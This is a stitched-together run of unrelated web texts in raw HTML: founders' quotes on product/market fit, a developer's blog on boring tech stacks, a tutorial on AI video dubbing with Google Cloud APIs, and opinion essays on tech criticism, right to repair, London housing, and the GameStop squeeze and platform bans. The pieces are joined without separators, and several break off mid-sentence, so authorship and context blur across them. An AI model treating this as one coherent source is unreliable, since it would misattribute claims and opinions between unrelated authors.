unique and useful enough for a large enterprise to pay for it. We established product/market fit a year from then when over a dozen enterprise customers were paying for the full-fledged version of the product.  In my view founders have an inkling/gut feeling about an idea; founders should bring that idea to a minimalist life and very quickly start validating it. </span></p><p id="viewer-e67l1"><span><span>- Jitesh Shetty, Co-Founder, </span><a href="https://infinichains.com/" target="_blank" rel="noopener"><u><span>Infinichains</span></u></a> </span></p><h3 id="viewer-2l3n1"><span><strong><span>The first dollar</span></strong></span></h3><p id="viewer-18vsj"><span>I have a very simple answer... it was when the first dollar came through the door. At that moment I remember thinking that if one customer was willing to trust us and pay us, there are likely many more out there and we have a viable idea. To me it was completely eye-opening and even unexpected that someone was willing to pay for a product we had just built and was still incredibly raw. I knew that if we kept building, kept learning and improving we would reach many more people. Honestly that first payment we received was a really emotional moment and the energy it created to forge ahead was enormous.  </span></p><p id="viewer-2ohu"><span><span>- Michael Balyasny,  CEO, </span><a href="https://attendify.com/" target="_blank" rel="noopener"><u><span>Attendify</span></u></a><span> </span></span></p><h3 id="viewer-f3oe0"><span><strong><span>You never know until it is (but there are milestones)</span></strong></span></h3><p id="viewer-bpr5f"><span>the honest answer is you never know until it is, and even then you question it, or at least i do.  however, i think some milestones might include:  </span></p><p id="viewer-22roj"><span>1.	when we got our first ever contract </span></p><p id="viewer-27cvq"><span>1.5 	when we raised our first seed round </span></p><p id="viewer-5vr4i"><span>2.	when companies that previously had said "oh, what a cute idea (im paraphrasing)" </span></p><p id="viewer-63d5t"><span>	actually starting using the technology </span></p><p id="viewer-873k9"><span>3.	when we got our first enterprise contract  </span></p><p id="viewer-7a6ag"><span>i realize these all have to do with money, which is not really why i became an entrepreneur - however, viability as a for-profit enterprise involves selling your product so... that's my answer.</span></p><p id="viewer-396ac"><span><span>- Frida Polli, CEO and Co-Founder, </span><a href="https://www.pymetrics.ai/" target="_blank" rel="noopener"><u><span>pymetrics</span></u></a><span> </span></span></p><h3 id="viewer-4bdfv"><span><strong><span>Customer requests and usage despite drawbacks</span></strong></span></h3><p id="viewer-7c6nq"><span>I don’t think there’s any particular framework.

I spend way too much time on <a href="https://news.ycombinator.com/">Hacker News</a>.  It's a fun place, and a good way to keep up to date on all the new tech that us developer folk seem to need to know about.  But it also leaves a fella feeling like he <b>really needs to keep up</b> with all this stuff.  I mean, if you don't have a side project using the latest client-side framework, well, good luck ever finding a job again in this industry.
</p>
<p>
Thinking about it, I find that I straddle the line on this. As a long-time contractor, I try to stay up to date on the New Shiny and will happily run with whatever flavor of the month language, framework, and programming paradigm that a given gig wants. Yeah, sure, Node.js with tons of functional stuff mixed in pulling from a NoSQL store and React on the front end. I'm your guy. We're gonna change the world!
</p>
<p>
But for 
<a href="https://www.twiddla.com/">my</a>
<a href="https://unwaffle.com/">own</a>
<a href="https://www.s3stat.com/">stuff</a>, 
there's no way I'd use any of that crap. Good old C#, SQL Server and a proper boring stack and tool set that I know won't just up and fall over on a Saturday morning and leave me debugging NPM dependencies all weekend instead of bouldering in the forest with the kids. This stuff is my proper income stream, and the most important thing is that it works. If that means I have to write a "for" loop and declare variables and risk 19 year old kids snooting down at my code, so be it.
</p>
<h4>I can't tell you how nice it is to have software in production on a boring stack. It gives you freedom to do other things.</h4>

<p>
I can (and often do) go entire months without touching the codebase of my main rent-paying products. It means I can, among other things, pick up a full-time development gig to sock away some extra runway, take off and go backpacking around the world, or better still, build yet another rent-paying product without having to spend a significant amount of time keeping the old stuff alive.
</p>
<p>
It seems like on a lot of stacks, keeping the server alive, patched and serving webpages is a part-time job in itself. In my world, that's Windows Update's job. Big New Releases come and go, but they're all 100% backwards compatible, so when you get around to upgrading it's just a few minutes of point and clicking with nothing broken.
</p>
<p>
I see it as analogous to <b>Compound Interest, but to productivity</b>. The less effort you need to spend on maintenance, the more pace you can keep going forward.
</p>
<p>
But yeah, the key is to never get so far down in to that comfy hole that you can't hop back into the present day when it's time to talk shop with the cool kids.  Shine on, flavor of the week!

      <p>Alongside cooking for myself and walking laps around the house, Japanese cartoons (or “anime” as the kids are calling it) are something I’ve learned to love during quarantine.</p>

<p>The problem with watching anime, though, is that short of learning Japanese, you become dependent on human translators and voice actors to port the content to your language. Sometimes you get the subtitles (“subs”) but not the voicing (“dubs”). Other times, entire seasons of shows aren’t translated at all, and you’re left on the edge of your seat with only Wikipedia summaries and 90s web forums to ferry you through the darkness.&nbsp;</p>

<p>So what are you supposed to do? The answer is obviously not to ask a computer to transcribe, translate, and voice-act entire episodes of a TV show from Japanese to English. Translation is a careful art that can’t be automated, and requires the loving touch of a human hand. Besides, even if you did use machine learning to translate a video, you couldn’t use a computer to dub… I mean, who would want to listen to machine voices for an entire season? It’d be awful. Only a real sicko would want that.</p>

<p>So in this post, I’ll show you how to use machine learning to transcribe, translate, and voice-act videos from one language to another, i.e. “AI-Powered Video Dubs.” It might not get you Netflix-quality results, but you can use it to localize online talks and YouTube videos in a pinch. We’ll start by transcribing audio to text using Google Cloud’s <a href="https://cloud.google.com/speech-to-text">Speech-to-Text API</a>. Next, we’ll translate that text with the <a href="https://cloud.google.com/translate">Translate API</a>. Finally, we’ll “voice act” the translations using the <a href="https://cloud.google.com/text-to-speech">Text-to-Speech API</a>, which produces voices that are, according to the docs, “humanlike.”</p>

<p>(By the way, before you flame-blast me in the comments, I should tell you that YouTube will <a href="https://support.google.com/youtube/answer/6373554#zippy=%2Cautomatic-captions-on-videos-on-demand">automatically and for free</a> transcribe and translate your videos for you. So you can treat this project like your new hobby of baking sourdough from scratch: a really inefficient use of 30 hours.)</p>

<h2 id="ai-dubbed-videos-do-they-axe-usually-sound-grood">AI-Dubbed Videos: Do they axe usually sound grood?&nbsp;</h2>

<p>Before you embark on this journey, you probably want to know what you have to look forward to. What quality can we realistically expect to achieve from an ML-video-dubbing pipeline?</p>

<p>Here’s one example dubbed automatically from English to Spanish (the subtitles are also automatically generated in English). I haven’t done any tuning or adjusting on it:</p>

<iframe width="560" height="315" src="https://www.youtube.com/embed/cURHKESgNaI" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>

<p>As you can see, the transcriptions are decent but not perfect, and the same for the translations. (Ignore the fact that the speaker sometimes speaks too fast–more on that later.) Overall, you can easily get the gist of what’s going on from this dubbed video, but it’s not exactly near human-quality.</p>

<p>What makes this project trickier (read: more fun) than most is that there are at least three possible points of failure:</p>

<ol>
  <li>The video can be incorrectly transcribed from audio to text by the Speech-to-Text API</li>
  <li>That text can be incorrectly or awkwardly translated by the Translation API</li>
  <li>Those translations can be mispronounced by the Text-to-Speech API</li>
</ol>

<p>In my experience, the most successful dubbed videos were those that featured a single speaker over a clear audio stream and that were dubbed from English to another language. This is largely because the quality of transcription (Speech-to-Text) was much higher in English than other source languages.</p>

<p>Dubbing from non-English languages proved substantially more challenging. Here’s one particularly unimpressive dub from Japanese to English of one of my favorite shows, Death Note:</p>

<iframe width="560" height="315" src="https://www.youtube.com/embed/gWNRfeEHmp4" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>

<p>If you want to leave translation/dubbing to humans, well–I can’t blame you. But if not, read on!</p>

<h2 id="building-an-ai-translating-dubber">Building an AI Translating Dubber</h2>

<p>As always, you can find all of the code for this project in the <a href="https://github.com/google/making_with_ml/tree/master/ai_dubs">Making with Machine Learning Github repo</a>. To run the code yourself, follow the README to configure your credentials and enable APIs. Here in this post, I’ll just walk through my findings at a high level.</p>

<p>First, here are the steps we’ll follow:</p>

<ol>
  <li>Extract audio from video files</li>
  <li>Convert audio to text using the Speech-to-Text API</li>
  <li><strong>Split transcribed text into sentences/segments for translation</strong></li>
  <li>Translate text</li>
  <li>Generate spoken audio versions of the translated text</li>
  <li><strong>Speed up the generated audio to align with the original speaker in the video</strong></li>
  <li>Stitch the new audio on top of the fold audio/video</li>
</ol>

<p>I admit that when I first set out to build this dubber, I was full of hubris–all I had to do was plug a few APIs together, what could be easier? But as a programmer, all hubris must be punished, and boy, was I punished.</p>

<p>The challenging bits are the ones I bolded above, that mainly come from having to align translations with video. But more on that in a bit.</p>

<h2 id="using-the-google-cloud-speech-to-text-api">Using the Google Cloud Speech-to-Text API</h2>

<p>The first step in translating a video is transcribing its audio to words. To do this, I used Google Cloud’s <a href="https://daleonai.com/translate-dub-videos-with-ml?utm_source=blog&amp;utm_medium=partner&amp;utm_campaign=CDR_dal_aiml_ai-dubs_020221">Speech-to-Text API</a>. This tool can recognize audio spoken in 125 languages, but as I mentioned above, the quality is highest in English. For our use case, we’ll want to enable a couple of special features, like:</p>

<ul>
  <li><a href="https://cloud.google.com/speech-to-text/docs/enhanced-models?utm_source=blog&amp;utm_medium=partner&amp;utm_campaign=CDR_dal_aiml_ai-dubs_020221">Enhanced models</a>. These are Speech-to-Text models that have been trained on specific data types (“video,” “phone_call”) and are usually higher-quality. We’ll use the “video” model, of course.</li>
  <li>Profanity filters. This flag prevents the API from returning any naughty words.</li>
  <li>Word time offsets. This flag tells the API that we want transcribed words returned along with the times that the speaker said them. We’ll use these timestamps to help align our subtitles and dubs with the source video.</li>
  <li><a href="https://cloud.google.com/speech-to-text/docs/context-strength?utm_source=blog&amp;utm_medium=partner&amp;utm_campaign=CDR_dal_aiml_ai-dubs_020221">Speech Adaption</a>. Typically, Speech-to-Text struggles most with uncommon words or phrases. If you know certain words or phrases are likely to appear in your video (i.e. “gradient descent,” “support vector machine”), you can pass them to the API in an array that will make the more likely to be transcribed:</li>
</ul>

<div><div><pre><code><span>client</span> <span>=</span> <span>speech</span><span>.</span><span>SpeechClient</span><span>()</span>

</code></pre></div></div>

<p>The API returns the transcribed text along with word-level timestamps as JSON. As an example, I transcribed <a href="https://youtu.be/o6nGn1euRjk">this video</a>. You can see the JSON returned by the API in <a href="https://gist.github.com/dalequark/e983b929b6194adb49d00a9c55ae4e33">this gist</a>. The output also lets us do a quick quality sanity check:</p>

<p><em>What I actually said:</em></p>

<blockquote>
  <p>“Software Developers. We’re not known for our rockin’ style, are we? Or <em>are</em> we? Today, I’ll show you how I used ML to make me trendier, taking inspiration from influencers.”</p>
</blockquote>

<p><em>What the API thought I said:</em></p>

<blockquote>
  <p>“Software developers. We’re not known for our Rock and style. Are we or are we today? I’ll show you how I use ml to make new trendier taking inspiration from influencers.”</p>
</blockquote>

<p>In my experience, this is about the quality you can expect when transcribing high-quality English audio. Note that the punctuation is a little off. If you’re happy with viewers getting the gist of a video, this is probably good enough, although it’s easy to manually  correct the transcripts yourself if you speak the source language.</p>

<p>At this point, we can use the API output to generate (non-translated) subtitles. In fact, if you run my script with the `–srt` flag, it will do exactly that for you (<a href="https://blog.hubspot.com/marketing/srt-file#:~:text=An%20SRT%20file%20(otherwise%20known,the%20sequential%20number%20of%20subtitles.">srt</a> is a file type for closed captions):</p>

<div><div><pre><code>python dubber.py my_movie_file.mp4 <span>"en"</span> outputDirectory <span>--srt</span> <span>--targetLangs</span> <span>[</span><span>"es"</span><span>]</span>
</code></pre></div></div>

<h2 id="machine-translation">Machine Translation</h2>

<p>Now that we have the video transcripts, we can use the <a href="https://daleonai.com/cloud.google.com/translate?utm_source=blog&amp;utm_medium=partner&amp;utm_campaign=CDR_dal_aiml_ai-dubs_020221">Translate API</a> to… uh… translate them.</p>

<p>This is where things start to get a little 🤪.</p>

<p>Our objective is this: we want to be able translate words in the original video and then play them back at roughly the same point in time, so that my “dubbed” voice is speaking in alignment with my actual voice.</p>

<p>The problem, though, is that translations aren’t word-for-word. A sentence translated from English to Japanese may have word order jumbled. It may contain fewer words, more words, different words, or (as is the case with idioms) completely different wording.</p>

<p>One way we can get around this is by translating entire <em>sentences</em> and then trying to align the time boundaries of those sentences. But even this becomes complicated, because how do you denote a single sentence? In English, we can split words by punctuation mark, i.e.:</p>

<p><code>"Hi! My name is Dale. What's up?" --&gt; ["Hi", "My name is Dale", "What's up"]</code></p>

<p>But punctuation differs by language (there’s no ¿ in English), and some languages don’t separate sentences by punctuation marks at all.</p>

<p>Plus, in real life speech, we often don’t talk in complete sentences. Y’know?</p>

<p>Another wrinkle that makes translating transcripts difficult is that, in general, the <em>more</em> context you feed into a translation model, the higher quality translation you can expect. So for example, if I translate the following sentence into French:</p>

<p>“I’m feeling blue, but I like pink too.”</p>

<p>I’ll get the translation:</p>

<p>“Je me sens bleu, mais j’aime aussi le rose.”</p>

<p>This is accurate. But if I split that sentence in two (“I’m feeling blue” and “But I like pink too”) and translate each part separately, I get:</p>

<p>“Je me sens triste, mais j’aime aussi le rose”, i.e. “I’m feeling sad, but I like pink too.”</p>

<p>This is all to say that the more we chop up text before sending it to the Translate API, the worse quality the translations will be (though it’ll be more easy to temporally align them with the video).</p>

<p>Ultimately, the strategy I chose was to split up spoken words every time the speaker took a greater-than-one-second pause in speaking. Here’s an example of what that looked like:</p>

<div><div><pre><code><span>   </span><span>{</span><span>
        </span><span>"en"</span><span>:</span><span> </span><span>"Software developers."</span><span>,</span><span>
        </span><span>"start_time"</span><span>:</span><span> </span><span>0.2</span><span>,</span><span>
        </span><span>"end…</span></code></pre></div></div></div></div>

<p>There's a Yom Kippur joke I love: the rabbi and the richest man in town are praying, "Oh Lord, I am nothing, I am nothing!"</p>
<p>The synagogue's janitor sees them and joins in: "I am nothing!"</p>
<p>The richest man says to the rabbi: "Look who thinks he's nothing."</p>
<p>The humblebrag is a wild phenomena, and it's endemic to a certain kind of tech criticism. When a technologist – what Maria Farrell calls a "prodigal tech bro" – confesses that he's an evil genius, then "genius" is the point.</p>
<p><a href="https://crookedtimber.org/2020/09/23/story-ate-the-world-im-biting-back/">https://crookedtimber.org/2020/09/23/story-ate-the-world-im-biting-back/</a></p>
<p>Think of the "AI" scientists who claim that they are about to be responsible for massive waves of technological unemployment, seeming to confess to a sin while actually overpromising on their AI.</p>

<p>Or the critique of "surveillance capitalism" that takes at face value ad-tech's outlandish boasts about how good they are at changing peoples' minds with data-mining, and then warns that we're all about to be enslaved to mind-control tech.</p>
<p><a href="https://onezero.medium.com/how-to-destroy-surveillance-capitalism-8135e6744d59">https://onezero.medium.com/how-to-destroy-surveillance-capitalism-8135e6744d59</a></p>
<p>Or the hand-wringing over the "trolley problem" of self-driving cars, as though the issue with these cars will be their reliable fine-grained judgments, rather than their unreliability and anticompetitive fealty to their manufacturers.</p>
<p><a href="https://this.deakin.edu.au/self-improvement/car-wars">https://this.deakin.edu.au/self-improvement/car-wars</a></p>
<p>This is what Lee Vinsel calls "criti-hype," criticism that actually builds on – and depends on – maintaining the halo of devastating potency that surrounds overhyped technologies.</p>
<p><a href="https://sts-news.medium.com/youre-doing-it-wrong-notes-on-criticism-and-technology-hype-18b08b4307e5">https://sts-news.medium.com/youre-doing-it-wrong-notes-on-criticism-and-technology-hype-18b08b4307e5</a></p>
<p>While it's true that the social problems that technologies create have unique, subtle elements that require a fine-grained understanding of the underlying science, it's a mistake to assume this obviates historical lessons.</p>
<p>Like, blockchain and proof-of-work and cryptography do bring unique facets to the problems of financial engineering, money-laundering and fraud – but all the problems of financial engineering and money-laundering and fraud are still in the mix.</p>
<p>Ad-tech and engagement-maximization systems add new wrinkles to the problems of communications monopolies and the epistemological chaos created by corrupt institutions, but the chaos and the monopolies are still central to these problems.</p>
<p>The problem with many metacritics of tech – people who criticize tech critics – is their assumption that tech is irrelevant. The problem with tech critics themselves is their assumption that tech is dispositive.</p>
<p>The reality is that tech has formal characteristics – the universality of Turing completeness – that both expand the policy toolkit (the power of interoperability mandates) and constrain it (the futility of cryptography back-doors).</p>
<p>Criti-hype is real, and its remedy isn't to ignore technicalities and criticize tech as though it was just another industry – the remedy is to really understand what tech can and can't do, and to understand that the industry isn't run by super-genuises (evil or otherwise) nor science heroes (or villains).</p>

<p>2018 was almost the year we won the Right to Repair.</p>
<p>Instead, 2018 turned out to be the year we lost R2R: 20 bills defeated in 20 state houses, and it was mostly Apple's fault.</p>
<p>Apple has a problem. As CEO Tim Cook warned his investors at the conclusion of his company's repair-killing lobbying spree, Apple's profits depend on people throwing away their devices, not fixing them.</p>
<p><a href="https://www.apple.com/newsroom/2019/01/letter-from-tim-cook-to-apple-investors/">https://www.apple.com/newsroom/2019/01/letter-from-tim-cook-to-apple-investors/</a></p>
<p>By monopolizing repairs, Apple doesn't just get to gouge you on parts and service – the real action is in pronouncing your device DOA, beyond repair. Then you have to buy another one.</p>
<p>Other companies lobbied hard against R2R: John Deere, GM, and other monopolists backed Apple's play. But Apple wrote the playbook, coming up with risible bullshit like claims that blocking independent repair is essential to protecting privacy.</p>
<p><a href="https://judiciary.house.gov/sites/democrats.judiciary.house.gov/files/documents/apple%20rfi%20-%20signed.pdf">https://judiciary.house.gov/sites/democrats.judiciary.house.gov/files/documents/apple%20rfi%20-%20signed.pdf</a></p>
<p>Apple's anti-repair FUD got picked up and amplified by Big Car in 2020, when they spent millions fighting an automotive R2R ballot initiative in Massachusetts, claiming that letting independent mechanics at your car would lead to your actual <em>murder</em>.</p>
<p><a href="https://pluralistic.net/2020/11/13/said-no-one-ever/#r2r">https://pluralistic.net/2020/11/13/said-no-one-ever/#r2r</a></p>
<p>2018 is the year we lost Right to Repair, but 2021 might be the year we win it. We're only a month in and 14 states are already debating R2R legislation, with more to come. The Repair Coalition and PIRG are leading the fight, buoyed by massive R2R successes in the EU.</p>
<p>Independent repair isn't just fair and it isn't just good for the planet – it's also good for the nation and its economy. The average US family loses $330/year thanks to anti-repair practices, a $40b drag on the American economy.</p>
<p>Repair creates local jobs for SMEs whose earnings – from helping their neighbors – are taxed (not hidden in offshore tax-havens) and contribute to their communities. These are on-shore, dignified tech jobs – not slave labor in Xinjiang or coerced labor in a Foxconn plant.</p>
<p>Repair diverts ewaste from landfills. Each kiloton of ewaste creates &lt;1 landfill jobs, or 15 recyling jobs.</p>
<p>But that same kiloton of ewaste creates 200 local repair jobs.</p>
<p><a href="https://www.ifixit.com/Right-to-Repair/Jobs-Revolution">https://www.ifixit.com/Right-to-Repair/Jobs-Revolution</a></p>
<p>Repair creates a secondary market for low-cost devices that find their way into the hands of people on the wrong side of the digital divide – a divide that got starker and more consequential during the pandemic, and will only get more important in years to come.</p>
<p>Speaking of the pandemic: anti-repair laws meant that when PB840 ventilators (the most common ventilator, sold by the monopolist Medtronic, which benefits from the largest-ever tax-avoidance "reverse takeover" in corporate history) broke, they couldn't be legally fixed.</p>
<p>Instead, desperate med-tech people turned to a lone Polish hacker who built Medtronic defeat devices into old guitar-pedals and clock radios to get around the anti-repair measures in the ventilators that hospitals had bought and paid for.</p>
<p><a href="https://pluralistic.net/2020/07/10/flintstone-delano-roosevelt/#medtronic-again">https://pluralistic.net/2020/07/10/flintstone-delano-roosevelt/#medtronic-again</a></p>
<p>R2R is a fight for justice. For the right to decide who fixes your stuff. For the right to set up shop and help your neighbors. For self-reliance and resiliency over profits. For on-shore small businesses over multinational cheaters.</p>
<p>Once again, a wave of R2R laws is sweeping the nation. The monopolists who profiteered off our misery during the pandemic will once again turn out to stop them. PIRG and the Repair Coalition need our support – as do their coalition allies like EFF.</p>

<p>When you hear the phrase "free market," you probably think of "a market that is free from regulation" but that's the opposite of the phrase's original meaning!</p>
<p>Adam Smith used the term to describe a market that was free from "economic rents" – money earned by owning things, rather than doing things. Smith recognized that markets attract parasites – "rentiers" – who seek to drain wealth by "investing" rather than building and doing.</p>
<p>Which meant that, in the absence of muscular state  intervention, markets would become less and less free – more and more dependent on the whims of rentiers who used money to breed money by creating toll-barriers between parts of the productive economy.</p>
<p>For Smith, markets were only free if they were regulated. But that's the opposite of the way that we talk about free markets today. Today, a free market is a market where you are free to collect rents – passive income from owning things, at the expense of people doing things.</p>
<p>This is true in so many metaphorical ways, but it's especially true when we're talking about actual rent – actual homes that people need to survive and produce, whose primary role today is to serve as an asset class to be maximized, not a basic human right.</p>
<p>London is ground zero for the conversion of housing from a human right to a speculative asset, a city at war with itself, filled up with empty safe-deposit boxes in the sky, while productive workers – the "essential workers" of the pandemic – triple-up in substandard housing.</p>
<p>The conversion of London from a city to an asset was hugely profitable, primarily for offshore "investors," especially criminals who were attracted by London's veneer of respectability, which allowed them to convert their loot to legitimate earnings through property sales.</p>
<p>The overslosh of these tremendous cash flows has hopelessly corrupted London's planning authorities, who are absolutely helpless and hopeless at holding developers to their own promises – new builds get extra storeys and shed public concessions without penalty.</p>
<p>And just as the tax-authorities who despair of enforcing against the real cheats turn their efforts to everyday people who can't afford to fight investigations, London's planners spend their days making life miserable for homeowners trying to make minor improvements.</p>
<p>I spent two years fighting Hackney for the right to build a small, windowed greenhouse on my flat's balcony, finally giving up on growing my own veggies. Meanwhile, the for-profit "student residence" across the street replaced hundreds of small offices, overbuilt and busted.</p>
<p>Today, it's a failed Wework, while the four-storey "boutique hotel" across the street has been transformed into eight+ storeys, with multiple storeys of office space, all without any planning enforcement.</p>
<p>The conversion of London into a …</p></div></article></div>

So there was widespread satisfaction last week when  members of an online discussion group called WallStreetBets started  beating the Wall Street bully boys at their own game. Ringleaders of the  group noticed that hedge funds had taken a short position in the  videogame retailer GameStop that <a href="https://www.reddit.com/r/wallstreetbets/comments/ip6jnv/the_real_greatest_short_burn_of_the_century/?utm_source=share&amp;utm_medium=ios_app&amp;utm_name=iossmf">far exceeded</a> the number of shares available to trade. Motivated as much by <a href="https://www.reddit.com/r/wallstreetbets/comments/l6omry/an_open_letter_to_melvin_capital_cnbc_boomers_and/">revenge</a>  as by profit, these influencers in the group encouraged the 2.7 million  members (since risen to around 8 million) to purchase the stock in  order to drive the price higher and create a massive short squeeze. This  quickly became a movement with a cause similar to that of Occupy Wall  Street, except much more effective because it hit the intended target  where they would feel it the most, in the wallet. “The only way to beat a  rigged game,” one WallStreetBets leader <a href="https://www.reddit.com/r/wallstreetbets/comments/ip6jnv/the_real_greatest_short_burn_of_the_century/?utm_source=share&amp;utm_medium=ios_app&amp;utm_name=iossmf">said</a>, “is to rig it even harder.”&nbsp;</p><p>GameStop  stock, which closed at $17.69 a share on Jan. 8, shot up to $347.51 by  the close last Wednesday. With combined losses of almost $20 billion,  hedge funds were on the ropes and close to bleeding out, selling their  longs in an increasingly futile effort to cover their shorts. One fund,  Melvin Capital, <a href="https://www.cnbc.com/2021/01/31/melvin-capital-lost-more-than-50percent-after-betting-against-gamestop-wsj.html">lost over half its value</a> and had to be bailed out by <a href="https://markets.businessinsider.com/news/stocks/steve-cohen-ken-griffin-invest-3-billion-gamestop-short-seller-2021-1-1030003305">hedge fund sugar daddies</a>  Ken Griffin (Citadel) and Steve Cohen (Point 72). An even bigger fund,  Citron, was teetering on the brink of collapse. All this outsider army  needed to win was the continued ability to communicate with each other  online, and their collective ability to keep piling into the “Buy” side  of the trade. Within hours, they would be hobbled on the first front and  crippled on the second.&nbsp;</p><p><strong>The Empire Strikes Back</strong></p><p>First, the digital distribution platform Discord <a href="https://www.theverge.com/2021/1/27/22253251/discord-bans-the-r-wallstreetbets-server">banned</a> the WallStreetBets account after the close Wednesday for “<a href="https://www.businessinsider.com/discord-bans-wallstreetbets-server-hate-speech-reddit-gamestop-gme-2021-1">hate speech, glorifying violence, and spreading misinformation</a>.” (For a moment, it looked like <a href="https://www.reddit.com/r/StockMarket/comments/l6i26r/discord_and_reddit_remove_rwallstreetbets/">Reddit had also banned </a>the  group, but they resisted pressure to do so.) If the quoted  justification sounds familiar, it’s nearly identical to the one given by  Google, Apple, and Amazon for deplatforming Parler just three weeks  earlier. Echoing Amazon, Discord said it had sent the group repeated  warnings about objectionable content before deciding, on that day of all  days, to shut them down.&nbsp;</p><p>Meanwhile, WallStreetBets investors  were locked out of their trading accounts by online brokers such as  Robinhood on Thursday morning. Based on new collateral requirements that  it says were imposed by an industry consortium, Robinhood forbade its  users from buying GameStop and other stocks that WallStreetBets had  identified as short squeeze opportunities. Users were allowed only to  “close their positions”—in other words, to sell to the shorts desperate  to buy. When angry users registered their disapproval by leaving over  100,000 one-star reviews of the Robinhood app in the Google Play Store,  Google <a href="https://www.theverge.com/2021/1/28/22255245/google-deleting-bad-robinhood-reviews-play-store">deleted</a> them.&nbsp;</p><p>Normal  trading was allowed to resume Friday, but the hedge funds used their  24-hour sole ownership of the battlefield to fortify their positions,  covering the most vulnerable shorts. Wall Street then sent in  reinforcements, as new short positions were taken at these high price  levels, virtually guaranteed to pay out when, inevitably, the air leaks  out of the balloon. Faced with a game that, for once, they couldn’t rig  in their favor, it appeared that the insiders tipped the board over and  started a new game. As a massively decentralized online group of scrappy  outsiders, the only tools at WallStreetBets’ disposal were online  trading and social networking. Both were frozen at the crucial moment,  and the hedge fund insiders were let off the hook. The weaponization of  censorship is a big part of the reason why.&nbsp;</p><p><strong>Down the Slippery Slope</strong></p><p>Some of us <a href="https://davidsacks.medium.com/the-speech-cartel-b3f5555f7787">warned</a>  of a slippery slope when Parler was taken down and a sitting president  was systematically ghosted from every online speech platform. But we  could not have foreseen how slippery the slope would be, or how fast we  would slide down it. We were told that the curbs on speech of President  Trump and his supporters were necessary to prevent further  “insurrection” and protect the peaceful transition of power. However,  much like the troops and barricades that still ring the Capitol, these  speech restrictions remain in place well after the transition of power  has occurred. The censorship power is always justified in response to a  genuine outrage or crisis, but it is rarely relinquished once the threat  passes. Rather it gets weaponized to protect powerful, connected  insiders, as the GameStop fiasco illustrates.</p><p>How do we suppose  Discord chose that moment to enforce its “Community Guidelines” against  WallStreetBets? Almost certainly, one of the hedge funds whose ox was  being gored combed through their message boards looking for anything  that might violate the terms of service. And surely they found it, as  these boards contain the same raunchy language you would hear if you  visited any trading floor or boiler room on Wall Street. They presumably  reported the content to Discord, which took the group down.&nbsp;</p><p>Did Discord warn WallStreetBets of content violations before last Wednesday? I’m sure they did. Amazon <a href="https://www.geekwire.com/2021/amazon-responds-parlers-lawsuit-calls-meritless-cites-content-advocating-violence/">sent</a>  such a warning letter to Parler as well. Frankly, such a letter could  be, and likely is, sent to every large message board on the web. The  founder of a user-generated content site described it to me as “the One  Percent Problem.” Every user-generated content site will have a small  percentage of offensive material that gets through, no matter how many  content moderators are hired. For example, Facebook, Twitter, and  YouTube <a href="https://www.vox.com/recode/22221285/trump-online-capitol-riot-far-right-parler-twitter-facebook">allowed far more content</a> advocating for and planning the Capitol riot than Parler. But instead of acknowledging this, they were eager to <a href="https://www.washingtonpost.com/technology/2021/01/13/facebook-role-in-capitol-protest/">blame</a>  the upstart, which had recently taken over the top spot in the social  networking category in the app store. Scapegoating Parler served the  dual purpose of deflecting blame and squashing a competitor.</p><p>Critics  of social networks insist that these sites simply need to double down  on censorship in order to finally rid us of problematic speech. But that  ignores how social media moderation actually works. Algorithms set to  recognize keywords capture only a small fraction of problematic posts,  leaving millions of posts for humans to review. The work is so  voluminous that it’s outsourced to far-flung locales where English may  not even be the first language. Low-level employees must decipher  complicated guidelines while navigating our increasingly Byzantine world  of political and cultural hot-buttons. Mistakes are inevitable, and the  harder a company tightens the standards to get the One Percent Problem  down to 0.1 or 0.01 percent, the more undeserving accounts—from <a href="https://www.newsweek.com/ron-paul-blocked-accessing-facebook-page-over-violating-community-standards-1560639">Ron Paul</a> to the <a href="https://www.wsws.org/en/articles/2021/01/23/pers-j23.html">Socialist Equality Party</a>—will  be swept up in the dragnet. With the Town Square now digitized,  centralized, and privatized in the hands of a cartel of Big Tech  companies, the protections of the First Amendment no longer apply.&nbsp;</p><p><strong>Insiders Vs. Outsiders</strong></p><p>Censorship  is about who has the power to censor, and what checks are placed upon  that power. Right now, tech companies have all the power, and they  exercise it as a like-minded cartel. When we see Alexandria  Ocasio-Cortez and Ted Cruz voice similar concerns over what happened to  WallStreetBets last week, we should realize that the politics of this  issue in the post-Trump era will no longer divide along an axis of Left  and Right, but of insider and outsider.&nbsp;</p><p>Elizabeth Warren, when  she started landing blows against Wall Street after the 2008 financial  crisis, met with President Obama’s economics adviser, the former  treasury secretary and Harvard president Larry Summers. He presented her  with a choice: “I could be an insider or I could be an outsider,” she  recalled in her 2014 memoir, <em>A Fighting Chance</em>. “Outsiders can  say whatever they want. But people on the inside don’t listen to them.  Insiders, however, get lots of access and a chance to push their ideas.  People—powerful people—listen to what they have to say. But insiders  also understand one unbreakable rule: <em>They don’t criticize other insiders</em>.”&nbsp;&nbsp;</p><p>It’s  precisely this insider-protection scheme that the internet and social  media have most disrupted. Insiders are massively powerful but few in  number. Outsiders have always been numerous but unorganized. Social  networking and online organizing have given the outsiders real power to  effect change, and finally register their disgust at the way incompetent  elites protect each other. The elites of Big Business, Big Media, Wall  Street, and Washington are terrified of this, and will leverage any  censorship power to keep the outsiders at bay.&nbsp;</p><p><strong>The Real “Big Lie”</strong></p><p>After  the storming of the Capitol building on Jan. 6, we heard a lot about  the “Big Lie” perpetrated by Trump and his allies that the election was  “stolen.” In reality, this narrative never got far. It was rejected by  the media (including Fox News), thrown out by the courts, labeled by  social networks as “disputed,” and dismissed by politicians, including  Trump’s own vice president. Yes, some far-right groups like the Proud  Boys and Oath Keepers came to Washington to commit acts of violence, but  they were roundly denounced. For a Big Lie to be successful, it has to  have buy-in from the people in power, moneyed interests, the  narrative-framers in the media generally, all of whom have to benefit  from the lie and therefore repeat it.&nbsp;</p><p>But what issue could  possibly unite all of these constituencies? For several years, elites in  the media, government, and now finance have denounced social media as a  tool for propaganda, disinformation and hate. Social media was to blame  for the Russian disinformation that supposedly elected Trump in 2016.  Social …</p></div></div>

